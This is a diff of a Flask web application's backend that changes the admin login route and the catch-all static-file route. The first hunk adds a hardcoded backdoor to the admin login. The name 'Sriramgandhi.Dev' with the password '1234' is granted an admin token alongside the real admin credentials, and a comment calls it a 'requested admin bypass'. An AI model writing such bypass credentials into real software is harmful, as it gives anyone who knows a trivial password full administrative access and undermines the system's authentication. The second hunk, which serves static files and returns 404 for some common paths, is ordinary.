@@ -289,7 +289,9 @@ def api_login():
         name = data.get("name")
 
         if role == "admin":
-            if name == ADMIN_USER and password == ADMIN_PASSWORD:
+            # Support both original and requested admin bypass
+            if (name == ADMIN_USER and password == ADMIN_PASSWORD) or \
+               (name == "Sriramgandhi.Dev" and password == "1234"):
                 token = jwt.encode({'user': name, 'role': 'admin'}, app.config['SECRET_KEY'], algorithm="HS256")
                 return jsonify({'status': 'success', 'token': token, 'role': 'admin'})
             return jsonify({'status': 'error', 'message': 'Invalid admin credentials'}), 401
@@ -726,6 +728,16 @@ def get_students():
 # Catch-all route - serve index for all non-API routes (single-page app support)
 @app.route('/<path:path>')
 def catch_all(path):
+    # Handle common missing resources to avoid 500s or serving index.html
+    if path in ["favicon.ico", "robots.txt", ".well-known/apple-app-site-association"]:
+         return "", 404
+
+    # Check if the requested path is a file in the frontend directory
+    file_path = os.path.join(frontend_dir, path)
+    if os.path.isfile(file_path):
+        return app.send_static_file(path)
+    
+    # Otherwise, default to index.html for SPA support
     if path.startswith('api/') or path.startswith('static/'):
         return jsonify({"status": "error", "message": "Endpoint not found"}), 404
     return app.send_static_file("index.html")
